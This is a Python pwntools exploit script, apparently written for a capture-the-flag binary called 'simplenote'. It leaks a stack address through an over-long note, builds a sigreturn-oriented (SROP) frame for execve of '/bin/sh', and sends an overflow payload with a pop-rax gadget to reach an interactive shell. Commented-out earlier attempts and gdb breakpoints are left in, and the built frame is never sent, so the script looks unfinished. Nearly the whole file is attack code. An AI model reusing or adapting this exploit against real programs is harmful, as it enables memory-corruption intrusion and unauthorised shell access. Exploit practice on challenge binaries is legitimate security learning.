#!/bin/python
from pwn import *
exe = ELF('./simplenote')
p = process(exe.path)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''

           b*0x040113f      
           # b*0x040117d      
           # b*0x40123a
           # b*main+287
        
           
           ''')
#################exploiting#####################
context.clear(arch='amd64')

# pop_rax = 0x0000000000401239
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', b'a')
# pop_rax = 0x0000000000401239
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', b'a')
# pop_rax = 0x0000000000401239
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', b'a')
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', p64(0)*2+ b'/bin/sh\0')
# p.sendafter(b'>',b'4')
# p.sendafter(b'>',b'4')
# p.sendafter(b'>',b'4')
# p.sendafter(b'>',b'4')
pop_rax = 0x0000000000401239
p.sendafter(b'>',b'1')
p.sendafter(b'Data:', b'a'*0x40)            #1
p.sendafter(b'>', b'2')
p.recvuntil(b'a'*0x40)
leak_addr = u64(p.recv(1) + p.recv(1)+p.recv(1) + p.recv(1) +p.recv(1)+p.recv(1) + b'\x00\x00')
log.info(f'leak_addr: {hex(leak_addr)}')

shit_code = leak_addr + 448
####################################################################

bin_sh = leak_addr - 64 
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0

payload = flat(frame)

##########################################

###############################################
              #2

p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')
payload = b'a' * 0x18
payload += p64(pop_rax) + p64(0xf)
p.sendafter(b'>',b'1')
p.sendafter(b'Data:',payload)                #6
p.sendafter(b'>',b'4')
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', b'b'*0x40)
# p.sendafter(b'>',b'4')

##############the end###########################
p.interactive()
